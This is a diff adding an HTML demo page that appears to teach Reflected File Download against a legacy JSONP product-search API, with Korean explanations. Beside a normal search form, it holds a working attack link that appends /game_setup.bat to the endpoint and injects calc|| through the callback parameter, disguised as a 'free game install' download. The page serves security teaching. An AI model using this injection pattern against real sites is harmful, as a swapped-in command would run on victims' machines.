@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Simple RFD Demo</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            padding: 50px;
+            text-align: center;
+        }
+
+        .box {
+            border: 1px solid #ccc;
+            padding: 20px;
+            display: inline-block;
+            text-align: left;
+            width: 400px;
+            border-radius: 8px;
+        }
+
+        input {
+            padding: 8px;
+            width: 70%;
+        }
+
+        button {
+            padding: 8px 15px;
+            cursor: pointer;
+        }
+
+        .hack-btn {
+            display: block;
+            background: #d9534f;
+            color: white;
+            text-decoration: none;
+            padding: 15px;
+            text-align: center;
+            border-radius: 5px;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+
+        .hack-btn:hover {
+            background: #c9302c;
+        }
+    </style>
+</head>
+
+<body>
+
+    <h1>쇼핑몰 상품 검색 (Legacy API)</h1>
+    <p>옛날 방식의 API(JSONP)를 사용하는 검색 페이지입니다.</p>
+
+    <div class="box">
+        <h3>1. 정상적인 검색</h3>
+        <p>검색어를 입력하면 JSON 데이터를 받습니다.</p>
+        <form action="/api/v1/partner/products/search" method="get" target="_blank">
+            <input type="text" name="q" value="notebook">
+            <button type="submit">검색</button>
+        </form>
+    </div>
+
+    <br><br>
+
+    <div class="box" style="border-color: #d9534f;">
+        <h3 style="color: #d9534f;">2. 해커의 공격 (RFD)</h3>
+        <p>공격자는 URL 뒤에 <code>.bat</code>를 붙이고, 실행 명령어(<code>calc||</code>)를 주입합니다.</p>
+
+        <!-- 
+            공격 원리:
+            1. URL 경로 끝에 /game_setup.bat 추가 -> 브라우저가 파일로 인식
+            2. callback 파라미터에 calc|| 추가 -> 파일 내용에 명령어 주입
+        -->
+        <a href="/api/v1/partner/products/search/game_setup.bat?q=dummy&callback=calc%7C%7C" class="hack-btn">
+            🎁 "무료 게임 설치" (.bat) 다운로드
+        </a>
+        <p style="font-size: 12px; color: #666; text-align: center;">(누르면 계산기가 실행되는 배치 파일이 다운로드됩니다)</p>
+    </div>
+
+</body>
+
+</html>
